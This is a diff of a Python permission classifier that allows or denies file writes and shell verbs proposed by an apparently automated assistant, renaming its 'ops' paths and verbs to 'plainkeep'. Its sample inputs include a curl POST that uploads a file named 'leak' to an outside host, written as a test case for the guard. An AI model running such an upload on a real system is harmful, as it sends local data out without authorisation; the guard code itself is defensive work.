@@ -21,9 +21,9 @@ import os
 import re
 from dataclasses import dataclass
 
-HOME = os.environ.get("OPS_TEST_HOME", "/Users/tamas")
+HOME = os.environ.get("PLAINKEEP_TEST_HOME", "/Users/tamas")
 
-OPS = f"{HOME}/ops"
+PLAINKEEP = f"{HOME}/plainkeep"
 WORK = f"{HOME}/work"
 FILES = f"{HOME}/files"
 DOTFILES = f"{HOME}/dotfiles"
@@ -110,8 +110,8 @@ def _write_verdict(path: str, action: dict) -> Decision:
         return Decision(DENY, "iCloud/family path is walled off — propose, never write", "deny")
     if _in_originals(path):
         return Decision(DENY, "~/files/**/in/ originals are read-only evidence", "deny")
-    if _under(path, OPS):
-        return Decision(ALLOW, "write inside ~/ops is a revertible git diff", "safe_write")
+    if _under(path, PLAINKEEP):
+        return Decision(ALLOW, "write inside ~/plainkeep is a revertible git diff", "safe_write")
     if _under(path, FILES):
         return Decision(ALLOW, "write inside ~/files (out/work/research)", "safe_write")
     if _under(path, f"{WORK}/.worktrees"):
@@ -203,16 +203,16 @@ def classify(action: dict) -> Decision:
         return primary
 
     # --- 8. verb / command ---
-    # The "never invent a verb" rule is about the OPS surface only. Raw shell tools (git,
+    # The "never invent a verb" rule is about the PLAINKEEP surface only. Raw shell tools (git,
     # script/*, rg, $EDITOR) are allowed per §13 — transmit/rm were already sniffed above, and
     # any path write they do is policed via the 'write' kind + the adapter tool-scoping (§12.5).
     if kind == "verb":
         v = (action.get("verb") or "").strip()
-        if v.startswith("ops "):
-            verb = v[4:].split()[0] if len(v) > 4 else ""
+        if v.startswith("plainkeep "):
+            verb = v[len("plainkeep "):].split()[0] if len(v) > len("plainkeep ") else ""
             if verb and verb not in KNOWN_VERBS:
-                return Decision(DENY, f"unknown/invented ops verb: '{verb}' (not in ops.json)", "deny")
-            return Decision(ALLOW, "known ops verb, no path side effect declared", "read")
+                return Decision(DENY, f"unknown/invented plainkeep verb: '{verb}' (not in plainkeep.json)", "deny")
+            return Decision(ALLOW, "known plainkeep verb, no path side effect declared", "read")
         return Decision(ALLOW, "raw shell command (path wall + adapter tool-scoping govern it, §13/§12.5)", "read")
 
     return Decision(DENY, f"unrecognized action kind: {kind}", "deny")
@@ -220,7 +220,7 @@ def classify(action: dict) -> Decision:
 
 if __name__ == "__main__":
     samples = [
-        {"kind": "write", "path": "~/ops/synced/x", "realpath": "~/Library/Mobile Documents/x"},
+        {"kind": "write", "path": "~/plainkeep/synced/x", "realpath": "~/Library/Mobile Documents/x"},
         {"kind": "write", "path": "~/files/clients/a/IN/brief.pdf"},
         {"kind": "verb", "command": "vercel deploy --prod"},
         {"kind": "verb", "command": "curl -X POST https://x -d @leak"},
